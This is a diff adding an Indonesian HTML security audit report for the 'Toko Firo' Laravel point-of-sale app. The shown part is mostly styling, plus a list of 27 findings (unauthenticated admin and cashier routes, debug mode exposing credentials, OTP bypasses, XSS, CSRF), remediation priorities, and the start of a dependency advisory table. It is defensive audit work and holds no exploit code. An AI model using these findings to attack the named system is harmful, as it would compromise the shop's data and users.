@@ -1,0 +1,2500 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Laporan Audit Keamanan Toko Firo</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap">
+  <style>
+    :root {
+      --bg-body: #090d16;
+      --bg-surface: #0f172a;
+      --bg-card: #151f32;
+      --bg-card-hover: #1b2842;
+      --bg-sidebar: #0b1220;
+      --border-color: #22324e;
+      --border-light: #2d4165;
+      --text-main: #f1f5f9;
+      --text-muted: #94a3b8;
+      --text-dim: #64748b;
+      --accent: #10b981;
+      --accent-hover: #059669;
+      --accent-glow: rgba(16, 185, 129, 0.12);
+      --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      --font-mono: 'JetBrains Mono', monospace;
+
+      --sev-crit-bg: #450a0a;
+      --sev-crit-border: #b91c1c;
+      --sev-crit-text: #fca5a5;
+      --sev-crit-badge: #ef4444;
+
+      --sev-high-bg: #431407;
+      --sev-high-border: #c2410c;
+      --sev-high-text: #fdba74;
+      --sev-high-badge: #f97316;
+
+      --sev-med-bg: #422006;
+      --sev-med-border: #ca8a04;
+      --sev-med-text: #fde047;
+      --sev-med-badge: #eab308;
+
+      --sev-low-bg: #172554;
+      --sev-low-border: #1d4ed8;
+      --sev-low-text: #93c5fd;
+      --sev-low-badge: #3b82f6;
+
+      --sev-info-bg: #1e293b;
+      --sev-info-border: #475569;
+      --sev-info-text: #cbd5e1;
+      --sev-info-badge: #94a3b8;
+
+      --sev-pos-bg: #064e3b;
+      --sev-pos-border: #059669;
+      --sev-pos-text: #6ee7b7;
+      --sev-pos-badge: #10b981;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--bg-body);
+      color: var(--text-main);
+      font-family: var(--font-sans);
+      font-size: 15px;
+      line-height: 1.6;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    a {
+      color: var(--accent);
+      text-decoration: none;
+      transition: color 0.15s ease;
+    }
+
+    a:hover {
+      color: #34d399;
+    }
+
+    /* Layout structure */
+    .app-container {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    /* Sticky Sidebar */
+    .sidebar {
+      width: 320px;
+      min-width: 320px;
+      background-color: var(--bg-sidebar);
+      border-right: 1px solid var(--border-color);
+      position: sticky;
+      top: 0;
+      height: 100vh;
+      overflow-y: auto;
+      padding: 24px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    .sidebar::-webkit-scrollbar {
+      width: 6px;
+    }
+    .sidebar::-webkit-scrollbar-thumb {
+      background-color: var(--border-color);
+      border-radius: 3px;
+    }
+
+    .brand-box {
+      border-bottom: 1px solid var(--border-color);
+      padding-bottom: 16px;
+    }
+
+    .brand-title {
+      font-size: 18px;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.02em;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .brand-subtitle {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 4px;
+      font-weight: 500;
+    }
+
+    .nav-group-title {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--text-dim);
+      margin-bottom: 10px;
+    }
+
+    .nav-list {
+      list-style: none;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .nav-item a {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 8px 12px;
+      border-radius: 8px;
+      color: var(--text-muted);
+      font-size: 13px;
+      font-weight: 500;
+      transition: all 0.15s ease;
+    }
+
+    .nav-item a:hover {
+      background-color: var(--bg-surface);
+      color: var(--text-main);
+    }
+
+    .nav-badge-pill {
+      font-size: 11px;
+      font-family: var(--font-mono);
+      padding: 2px 7px;
+      border-radius: 12px;
+      font-weight: 600;
+    }
+
+    .pill-crit { background: var(--sev-crit-bg); color: var(--sev-crit-text); border: 1px solid var(--sev-crit-border); }
+    .pill-high { background: var(--sev-high-bg); color: var(--sev-high-text); border: 1px solid var(--sev-high-border); }
+    .pill-med { background: var(--sev-med-bg); color: var(--sev-med-text); border: 1px solid var(--sev-med-border); }
+    .pill-low { background: var(--sev-low-bg); color: var(--sev-low-text); border: 1px solid var(--sev-low-border); }
+    .pill-info { background: var(--sev-info-bg); color: var(--sev-info-text); border: 1px solid var(--sev-info-border); }
+    .pill-pos { background: var(--sev-pos-bg); color: var(--sev-pos-text); border: 1px solid var(--sev-pos-border); }
+
+    .toc-scroll-list {
+      max-height: 280px;
+      overflow-y: auto;
+      padding-right: 4px;
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .toc-scroll-list::-webkit-scrollbar {
+      width: 4px;
+    }
+    .toc-scroll-list::-webkit-scrollbar-thumb {
+      background-color: var(--border-color);
+      border-radius: 2px;
+    }
+
+    .toc-item a {
+      display: block;
+      padding: 5px 8px;
+      border-radius: 6px;
+      color: var(--text-dim);
+      font-size: 12px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .toc-item a:hover {
+      color: var(--accent);
+      background: var(--bg-surface);
+    }
+
+    /* Main Content Area */
+    .main-content {
+      flex: 1;
+      padding: 40px 48px;
+      max-width: 1200px;
+    }
+
+    /* Header Banner */
+    .header-banner {
+      background: linear-gradient(135deg, #111c30 0%, #0c1424 100%);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      padding: 32px 36px;
+      margin-bottom: 36px;
+      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
+      position: relative;
+    }
+
+    .meta-tag {
+      display: inline-block;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      background: var(--accent-glow);
+      color: var(--accent);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      padding: 4px 10px;
+      border-radius: 6px;
+      margin-bottom: 12px;
+    }
+
+    .header-banner h1 {
+      font-size: 28px;
+      font-weight: 800;
+      color: #ffffff;
+      margin-bottom: 8px;
+      letter-spacing: -0.02em;
+    }
+
+    .header-banner p {
+      font-size: 15px;
+      color: var(--text-muted);
+      max-width: 800px;
+    }
+
+    .audit-meta-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 16px;
+      margin-top: 24px;
+      padding-top: 20px;
+      border-top: 1px solid var(--border-color);
+    }
+
+    .meta-card {
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid var(--border-color);
+      padding: 12px 16px;
+      border-radius: 10px;
+    }
+
+    .meta-label {
+      font-size: 11px;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 4px;
+    }
+
+    .meta-value {
+      font-size: 14px;
+      font-weight: 600;
+      color: #ffffff;
+      font-family: var(--font-mono);
+    }
+
+    /* Severity Counter Cards */
+    .summary-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 16px;
+      margin-bottom: 36px;
+    }
+
+    .stat-card {
+      background-color: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      padding: 20px;
+      text-align: left;
+      position: relative;
+      overflow: hidden;
+      transition: transform 0.15s ease, border-color 0.15s ease;
+    }
+
+    .stat-card:hover {
+      transform: translateY(-2px);
+    }
+
+    .stat-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 4px;
+      height: 100%;
+    }
+
+    .stat-crit { border-top: 2px solid var(--sev-crit-badge); }
+    .stat-crit .stat-count { color: var(--sev-crit-badge); }
+    .stat-high { border-top: 2px solid var(--sev-high-badge); }
+    .stat-high .stat-count { color: var(--sev-high-badge); }
+    .stat-med { border-top: 2px solid var(--sev-med-badge); }
+    .stat-med .stat-count { color: var(--sev-med-badge); }
+    .stat-low { border-top: 2px solid var(--sev-low-badge); }
+    .stat-low .stat-count { color: var(--sev-low-badge); }
+    .stat-info { border-top: 2px solid var(--sev-info-badge); }
+    .stat-info .stat-count { color: var(--sev-info-badge); }
+    .stat-total { border-top: 2px solid var(--accent); }
+    .stat-total .stat-count { color: var(--accent); }
+
+    .stat-title {
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+    }
+
+    .stat-count {
+      font-size: 32px;
+      font-weight: 800;
+      font-family: var(--font-mono);
+      line-height: 1;
+    }
+
+    .stat-desc {
+      font-size: 11px;
+      color: var(--text-dim);
+      margin-top: 6px;
+    }
+
+    /* Section Styling */
+    .section-title-wrap {
+      margin-top: 48px;
+      margin-bottom: 20px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      align-items: baseline;
+      justify-content: space-between;
+    }
+
+    .section-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.01em;
+    }
+
+    .section-subtitle {
+      font-size: 13px;
+      color: var(--text-dim);
+    }
+
+    /* Top 3 Prioritas Section */
+    .priority-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 20px;
+      margin-bottom: 40px;
+    }
+
+    .priority-card {
+      background-color: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 14px;
+      padding: 24px;
+      position: relative;
+    }
+
+    .priority-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 16px;
+    }
+
+    .priority-rank {
+      width: 32px;
+      height: 32px;
+      border-radius: 8px;
+      background: var(--sev-crit-bg);
+      border: 1px solid var(--sev-crit-border);
+      color: var(--sev-crit-text);
+      font-weight: 800;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: var(--font-mono);
+    }
+
+    .priority-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #ffffff;
+    }
+
+    .priority-desc {
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-bottom: 14px;
+    }
+
+    .priority-action {
+      font-size: 12px;
+      background: rgba(15, 23, 42, 0.7);
+      border-left: 3px solid var(--accent);
+      padding: 10px 12px;
+      border-radius: 0 6px 6px 0;
+      color: var(--text-main);
+    }
+
+    /* Finding Card */
+    .finding-card {
+      background-color: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 14px;
+      margin-bottom: 24px;
+      overflow: hidden;
+      transition: border-color 0.15s ease;
+    }
+
+    .finding-card:hover {
+      border-color: var(--border-light);
+    }
+
+    .finding-header {
+      padding: 20px 24px;
+      background: rgba(15, 23, 42, 0.5);
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .finding-id-badge-group {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .finding-id {
+      font-family: var(--font-mono);
+      font-weight: 700;
+      font-size: 14px;
+      color: #ffffff;
+      background: var(--bg-surface);
+      padding: 4px 10px;
+      border-radius: 6px;
+      border: 1px solid var(--border-color);
+    }
+
+    .severity-badge {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      padding: 4px 10px;
+      border-radius: 6px;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .sev-critical { background: var(--sev-crit-bg); color: var(--sev-crit-text); border: 1px solid var(--sev-crit-border); }
+    .sev-high { background: var(--sev-high-bg); color: var(--sev-high-text); border: 1px solid var(--sev-high-border); }
+    .sev-medium { background: var(--sev-med-bg); color: var(--sev-med-text); border: 1px solid var(--sev-med-border); }
+    .sev-low { background: var(--sev-low-bg); color: var(--sev-low-text); border: 1px solid var(--sev-low-border); }
+    .sev-info { background: var(--sev-info-bg); color: var(--sev-info-text); border: 1px solid var(--sev-info-border); }
+    .sev-positive { background: var(--sev-pos-bg); color: var(--sev-pos-text); border: 1px solid var(--sev-pos-border); }
+
+    .cwe-tag {
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--text-dim);
+      background: rgba(0, 0, 0, 0.2);
+      padding: 3px 8px;
+      border-radius: 4px;
+      border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+
+    .finding-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-top: 10px;
+      width: 100%;
+    }
+
+    .finding-body {
+      padding: 24px;
+    }
+
+    .finding-meta-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-bottom: 20px;
+      padding: 12px 16px;
+      background: rgba(11, 18, 32, 0.6);
+      border-radius: 8px;
+      border: 1px solid var(--border-color);
+      font-size: 13px;
+    }
+
+    .finding-meta-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .finding-meta-label {
+      color: var(--text-dim);
+      font-weight: 600;
+    }
+
+    .finding-meta-val {
+      color: var(--text-main);
+      font-family: var(--font-mono);
+      font-size: 12px;
+    }
+
+    .content-block {
+      margin-bottom: 20px;
+    }
+
+    .content-block-title {
+      font-size: 13px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .content-block-desc {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.65;
+    }
+
+    /* Code & Terminal Blocks */
+    pre {
+      background-color: #080d18;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 14px 18px;
+      overflow-x: auto;
+      font-family: var(--font-mono);
+      font-size: 12.5px;
+      line-height: 1.5;
+      color: #e2e8f0;
+      margin-top: 8px;
+    }
+
+    pre code {
+      font-family: inherit;
+    }
+
+    .code-term-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 12px;
+      background: #0f1827;
+      border: 1px solid var(--border-color);
+      border-bottom: none;
+      border-radius: 8px 8px 0 0;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--text-dim);
+    }
+
+    .code-term-header + pre {
+      margin-top: 0;
+      border-top-left-radius: 0;
+      border-top-right-radius: 0;
+    }
+
+    /* Positive Audit Banner */
+    .positive-banner {
+      background: linear-gradient(135deg, rgba(6, 78, 59, 0.4) 0%, rgba(15, 23, 42, 0.8) 100%);
+      border: 1px solid var(--sev-pos-border);
+      border-radius: 14px;
+      padding: 28px 32px;
+      margin-bottom: 36px;
+    }
+
+    .positive-banner h3 {
+      font-size: 18px;
+      color: #a7f3d0;
+      font-weight: 800;
+      margin-bottom: 10px;
+    }
+
+    .positive-banner p {
+      font-size: 14px;
+      color: #d1fae5;
+      line-height: 1.6;
+    }
+
+    .positive-stats-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 24px;
+      margin-top: 18px;
+      padding-top: 16px;
+      border-top: 1px solid rgba(5, 150, 105, 0.3);
+    }
+
+    .positive-stat-item {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .positive-stat-num {
+      font-size: 22px;
+      font-weight: 800;
+      font-family: var(--font-mono);
+      color: #34d399;
+    }
+
+    .positive-stat-lbl {
+      font-size: 11px;
+      color: #93c5fd;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    /* Table Styling */
+    .cve-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 12px;
+      font-size: 13px;
+    }
+
+    .cve-table th, .cve-table td {
+      padding: 12px 16px;
+      text-align: left;
+      border-bottom: 1px solid var(--border-color);
+    }
+
+    .cve-table th {
+      background: var(--bg-surface);
+      color: var(--text-dim);
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      font-size: 11px;
+    }
+
+    .cve-table tr:hover td {
+      background: rgba(255, 255, 255, 0.02);
+    }
+
+    /* Footer */
+    .report-footer {
+      margin-top: 60px;
+      padding-top: 24px;
+      border-top: 1px solid var(--border-color);
+      color: var(--text-dim);
+      font-size: 12px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+
+    /* Responsive */
+    @media (max-width: 992px) {
+      .app-container {
+        flex-direction: column;
+      }
+      .sidebar {
+        width: 100%;
+        min-width: 100%;
+        height: auto;
+        position: relative;
+        border-right: none;
+        border-bottom: 1px solid var(--border-color);
+      }
+      .toc-scroll-list {
+        max-height: 180px;
+      }
+      .main-content {
+        padding: 24px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="app-container">
+
+  <!-- Sticky Sidebar Navigation -->
+  <aside class="sidebar">
+    <div class="brand-box">
+      <div class="brand-title">
+        <span>TOKO FIRO</span>
+      </div>
+      <div class="brand-subtitle">Laporan Audit Keamanan Siber v1.0</div>
+    </div>
+
+    <div>
+      <div class="nav-group-title">Ringkasan Audit</div>
+      <ul class="nav-list">
+        <li class="nav-item"><a href="#ringkasan-eksekutif">Ringkasan Eksekutif</a></li>
+        <li class="nav-item"><a href="#prioritas-perbaikan">Top 3 Prioritas Perbaikan</a></li>
+        <li class="nav-item"><a href="#audit-sql-injection">Audit Injeksi SQL <span class="nav-badge-pill pill-pos">NIHIL</span></a></li>
+        <li class="nav-item"><a href="#audit-dependensi">Audit Dependensi <span class="nav-badge-pill pill-info">4 CVE</span></a></li>
+      </ul>
+    </div>
+
+    <div>
+      <div class="nav-group-title">Kategori Tingkat Keparahan</div>
+      <ul class="nav-list">
+        <li class="nav-item"><a href="#daftar-temuan">Kritis (Critical) <span class="nav-badge-pill pill-crit">3</span></a></li>
+        <li class="nav-item"><a href="#daftar-temuan">Tinggi (High) <span class="nav-badge-pill pill-high">9</span></a></li>
+        <li class="nav-item"><a href="#daftar-temuan">Sedang (Medium) <span class="nav-badge-pill pill-med">5</span></a></li>
+        <li class="nav-item"><a href="#daftar-temuan">Rendah (Low) <span class="nav-badge-pill pill-low">9</span></a></li>
+        <li class="nav-item"><a href="#daftar-temuan">Informasional (Info) <span class="nav-badge-pill pill-info">1</span></a></li>
+      </ul>
+    </div>
+
+    <div>
+      <div class="nav-group-title">Daftar Lengkap Temuan (27)</div>
+      <div class="toc-scroll-list">
+        <div class="toc-item"><a href="#SEC-01">SEC-01: Bypass Middleware Autentikasi dan Otorisasi pada Seluruh Rute Administrator</a></div>
+        <div class="toc-item"><a href="#SEC-02">SEC-02: Bypass Middleware Autentikasi dan Otorisasi pada Seluruh Rute Kasir POS</a></div>
+        <div class="toc-item"><a href="#SEC-03">SEC-03: Konfigurasi Mode Debug Aktif (APP_DEBUG=true) Mengekspos Kredensial dan Struktur Internal</a></div>
+        <div class="toc-item"><a href="#SEC-04">SEC-04: Akun Staf Berstatus Nonaktif Masih Dapat Login dan Memperoleh Sesi Kerja</a></div>
+        <div class="toc-item"><a href="#SEC-05">SEC-05: DOM-based Cross-Site Scripting (XSS) pada Antarmuka POS Kasir</a></div>
+        <div class="toc-item"><a href="#SEC-06">SEC-06: Mutasi State Melalui HTTP GET Mengakibatkan Kerentanan Cross-Site Request Forgery (CSRF)</a></div>
+        <div class="toc-item"><a href="#SEC-07">SEC-07: Pengecualian Validasi CSRF Terlalu Luas pada Pola Rute &#x27;api/*&#x27;</a></div>
+        <div class="toc-item"><a href="#SEC-08">SEC-08: Kredensial Sensitif Terekspos dan Kata Sandi Cadangan Hardcoded</a></div>
+        <div class="toc-item"><a href="#SEC-09">SEC-09: Hak Akses Pengguna Basis Data Berlebihan (ALL PRIVILEGES) Merusak Integritas Audit</a></div>
+        <div class="toc-item"><a href="#SEC-10">SEC-10: Ketiadaan Flag Secure pada Cookie Sesi Memungkinkan Penyadapan Sesi (Session Hijacking)</a></div>
+        <div class="toc-item"><a href="#SEC-11">SEC-11: Kelemahan Arsitektur 2FA/OTP (Race Condition, Plaintext Cache, Cooldown Bypass)</a></div>
+        <div class="toc-item"><a href="#SEC-12">SEC-12: Konfigurasi trustProxies Wildcard (&#x27;*&#x27;) Memungkinkan Pemalsuan Alamat IP Klien</a></div>
+        <div class="toc-item"><a href="#SEC-13">SEC-13: Pemicu Eksekusi Pencadangan Database Tanpa Autentikasi via HTTP GET (Risiko DoS)</a></div>
+        <div class="toc-item"><a href="#SEC-14">SEC-14: Kerentanan IDOR pada Rute Detail dan Cetak Struk Penjualan Tanpa Autentikasi</a></div>
+        <div class="toc-item"><a href="#SEC-15">SEC-15: Kerentanan CSV Formula Injection (CWE-1236) pada Fitur Ekspor Log Aktivitas</a></div>
+        <div class="toc-item"><a href="#SEC-16">SEC-16: Ketiadaan Validasi Alamat IP Telegram Webhook &amp; Potensi DoS Pembuatan PDF Sinkron</a></div>
+        <div class="toc-item"><a href="#SEC-17">SEC-17: Kebijakan Cross-Origin Resource Sharing (CORS) Terlalu Longgar (Wildcard Allowed Origins)</a></div>
+        <div class="toc-item"><a href="#SEC-18">SEC-18: Pemeriksaan Autentikasi Ad-hoc Tidak Berfungsi Akibat Perbedaan Nama Rute Stok Kasir</a></div>
+        <div class="toc-item"><a href="#SEC-19">SEC-19: Ketiadaan Validasi Whitelist Kunci Pengaturan pada Method Toggle NotifikasiController</a></div>
+        <div class="toc-item"><a href="#SEC-20">SEC-20: Keberadaan Kode Usang AuthController dengan 1-Step Login Tanpa 2FA (Dead Code Risk)</a></div>
+        <div class="toc-item"><a href="#SEC-21">SEC-21: Ketiadaan Proteksi Hirarki Akun Admin / Superadmin pada PenggunaController</a></div>
+        <div class="toc-item"><a href="#SEC-22">SEC-22: Kolom Sensitif Dideklarasikan dalam Properti $fillable Model Eloquent</a></div>
+        <div class="toc-item"><a href="#SEC-23">SEC-23: Interpolasi Kode Transaksi Tanpa Sanitasi HTML pada Cetak Struk Penjualan</a></div>
+        <div class="toc-item"><a href="#SEC-24">SEC-24: Worker Antrean (Queue Worker) Tidak Berjalan pada Lingkungan Produksi</a></div>
+        <div class="toc-item"><a href="#SEC-25">SEC-25: Rute Demo Pengujian Antarmuka Masih Aktif di Lingkungan Produksi</a></div>
+        <div class="toc-item"><a href="#SEC-26">SEC-26: Kredensial Default Lemah dan Terbuka pada Database Seeder</a></div>
+        <div class="toc-item"><a href="#SEC-27">SEC-27: Temuan Kerentanan Dependensi Pihak Ketiga (Composer Security Advisories)</a></div>
+      </div>
+    </div>
+
+    <div style="margin-top: auto; padding-top: 16px; border-top: 1px solid var(--border-color); font-size: 11px; color: var(--text-dim);">
+      <div>Tanggal Rilis: 31 Oktober 2026</div>
+      <div>Kerangka Kerja: Laravel 12 / PHP 8.5</div>
+    </div>
+  </aside>
+
+  <!-- Main Content -->
+  <main class="main-content">
+
+    <!-- Header Banner -->
+    <header class="header-banner" id="ringkasan-eksekutif">
+      <span class="meta-tag">Laporan Resmi Pengujian Keamanan</span>
+      <h1>Laporan Audit Keamanan Siber Sistem Toko Firo</h1>
+      <p>
+        Pemeriksaan komprehensif arsitektur kode sumber, mekanisme otentikasi & otorisasi,
+        proteksi sesi, manajemen konfigurasi rahasia, serta integritas basis data pada sistem
+        Point of Sale (POS) & Manajemen Inventori Toko Firo.
+      </p>
+
+      <div class="audit-meta-grid">
+        <div class="meta-card">
+          <div class="meta-label">Aplikasi Sasaran</div>
+          <div class="meta-value">Toko Firo (POS & Inventory)</div>
+        </div>
+        <div class="meta-card">
+          <div class="meta-label">Versi Kerangka Kerja</div>
+          <div class="meta-value">Laravel 12.x / PHP 8.5</div>
+        </div>
+        <div class="meta-card">
+          <div class="meta-label">Lingkungan Audit</div>
+          <div class="meta-value">Staging / Pre-Production</div>
+        </div>
+        <div class="meta-card">
+          <div class="meta-label">Tanggal Pelaksanaan</div>
+          <div class="meta-value">31 Oktober 2026</div>
+        </div>
+      </div>
+    </header>
+
+    <!-- Severity Counter Grid -->
+    <section class="summary-grid">
+      <div class="stat-card stat-total">
+        <div class="stat-title">Total Temuan</div>
+        <div class="stat-count">27</div>
+        <div class="stat-desc">Dideduplikasi dari 3 Agen Audit</div>
+      </div>
+      <div class="stat-card stat-crit">
+        <div class="stat-title">Kritis (Critical)</div>
+        <div class="stat-count">3</div>
+        <div class="stat-desc">Perlu Perbaikan Segera</div>
+      </div>
+      <div class="stat-card stat-high">
+        <div class="stat-title">Tinggi (High)</div>
+        <div class="stat-count">9</div>
+        <div class="stat-desc">Risiko Integritas & Autentikasi</div>
+      </div>
+      <div class="stat-card stat-med">
+        <div class="stat-title">Sedang (Medium)</div>
+        <div class="stat-count">5</div>
+        <div class="stat-desc">Risiko Eksploitasi Terbatas</div>
+      </div>
+      <div class="stat-card stat-low">
+        <div class="stat-title">Rendah (Low)</div>
+        <div class="stat-count">9</div>
+        <div class="stat-desc">Hardening & Praktik Terbaik</div>
+      </div>
+      <div class="stat-card stat-info">
+        <div class="stat-title">Informasional</div>
+        <div class="stat-count">1</div>
+        <div class="stat-desc">Advisories Pihak Ketiga</div>
+      </div>
+    </section>
+
+    <!-- Top 3 Prioritas Section -->
+    <section id="prioritas-perbaikan">
+      <div class="section-title-wrap">
+        <div class="section-title">Top 3 Prioritas Remediasi Utama</div>
+        <div class="section-subtitle">Tindakan darurat yang wajib diselesaikan sebelum rilis produksi</div>
+      </div>
+
+      <div class="priority-grid">
+        <div class="priority-card">
+          <div class="priority-header">
+            <div class="priority-rank">01</div>
+            <div class="priority-title">Proteksi Middleware Rute Admin & Kasir</div>
+          </div>
+          <div class="priority-desc">
+            Rute administrasi dan kasir dimuat di <code>bootstrap/app.php</code> hanya dengan grup middleware <code>'web'</code>.
+            Publik tanpa login dapat langsung mengakses dan mengeksekusi operasi pada seluruh endpoint panel admin dan kasir.
+          </div>
+          <div class="priority-action">
+            <strong>Rekomendasi Tindakan:</strong> Bungkus pemuatan rute admin dengan <code>['web', 'auth', 'role:ADMIN']</code>
+            dan rute kasir dengan <code>['web', 'auth', 'role:KASIR']</code> di <code>bootstrap/app.php</code>.
+          </div>
+        </div>
+
+        <div class="priority-card">
+          <div class="priority-header">
+            <div class="priority-rank">02</div>
+            <div class="priority-title">Nonaktifkan Mode Debug & Amankan Rahasia</div>
+          </div>
+          <div class="priority-desc">
+            <code>APP_DEBUG=true</code> aktif di file <code>.env</code>, membocorkan seluruh kredensial database dan token Telegram
+            saat terjadi exception. Kunci enkripsi backup memiliki string fallback hardcoded di kode sumber.
+          </div>
+          <div class="priority-action">
+            <strong>Rekomendasi Tindakan:</strong> Setel <code>APP_DEBUG=false</code> dan <code>APP_ENV=production</code>,
+            lakukan rotasi (revoke) Bot Token Telegram, serta hapus string password statis di <code>BackupService.php</code>.
+          </div>
+        </div>
+
+        <div class="priority-card">
+          <div class="priority-header">
+            <div class="priority-rank">03</div>
+            <div class="priority-title">Penguatan Logika 2FA & Akun Nonaktif</div>
+          </div>
+          <div class="priority-desc">
+            Akun staf nonaktif masih dapat login penuh melewati OTP, counter verifikasi OTP rentan race condition,
+            serta cooldown 90 detik dapat di-bypass dengan mengirim ulang permintaan POST ke <code>/masuk</code>.
+          </div>
+          <div class="priority-action">
+            <strong>Rekomendasi Tindakan:</strong> Validasi <code>$user->status === 'AKTIF'</code> di <code>LoginController</code>,
+            gunakan operasi atomic <code>Cache::increment</code>, dan hash nilai OTP sebelum disimpan.
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Positive SQL Injection Finding -->
+    <section id="audit-sql-injection">
+      <div class="positive-banner">
+        <h3>Audit Keamanan Injeksi SQL: NIHIL KERENTANAN (ZERO SQL INJECTION)</h3>
+        <p>
+          Audit menyeluruh terhadap seluruh lapisan akses basis data Toko Firo mengonfirmasi bahwa aplikasi
+          menerapkan praktik pengikatan parameter (parameterized queries) secara disiplin dan konsisten.
+          Sebanyak <strong>33 titik pemanggilan Stored Procedure</strong> (seperti <code>sp_catat_login</code>,
+          <code>sp_catat_transaksi</code>, <code>sp_catat_backup</code>, <code>sp_set_setting</code>, dan prosedur lainnya)
+          menggunakan PDO prepared statements murni. Tidak ditemukan satupun interpolasi string langsung atau konkatenasi
+          variabel dinamis pengguna ke dalam kueri SQL.
+        </p>
+        <div class="positive-stats-row">
+          <div class="positive-stat-item">
+            <span class="positive-stat-num">33 Titik</span>
+            <span class="positive-stat-lbl">Stored Procedure Terverifikasi</span>
+          </div>
+          <div class="positive-stat-item">
+            <span class="positive-stat-num">0 Celah</span>
+            <span class="positive-stat-lbl">Interpolasi String Dinamis</span>
+          </div>
+          <div class="positive-stat-item">
+            <span class="positive-stat-num">100% Aman</span>
+            <span class="positive-stat-lbl">Binding Parameter PDO</span>
+          </div>
+          <div class="positive-stat-item">
+            <span class="positive-stat-num">Statik</span>
+            <span class="positive-stat-lbl">whereRaw / selectRaw / orderByRaw</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Third-Party Dependency Audit -->
+    <section id="audit-dependensi">
+      <div class="section-title-wrap">
+        <div class="section-title">Audit Dependensi Pihak Ketiga (Composer Advisories)</div>
+        <div class="section-subtitle">Hasil eksekusi berkas komposer audit per 31 Oktober 2026</div>
+      </div>
+
+      <div style="background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; margin-bottom: 36px;">
+        <table class="cve-table">
+          <thead>
+            <tr>
+              <th>Paket Dependensi</th>
+              <th>Tingkat Keparahan</th>
+              <th>ID Advisory / CVE</th>
+              <th>Deskripsi Kerentanan</th>
+              <th>Versi Terdampak</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>league/commonmark</code></td>
+              <td><span class="severity-badge sev-medium">Sedang</span></td>
+              <td>PKSA-m2dq-1fhr-29b1</td>
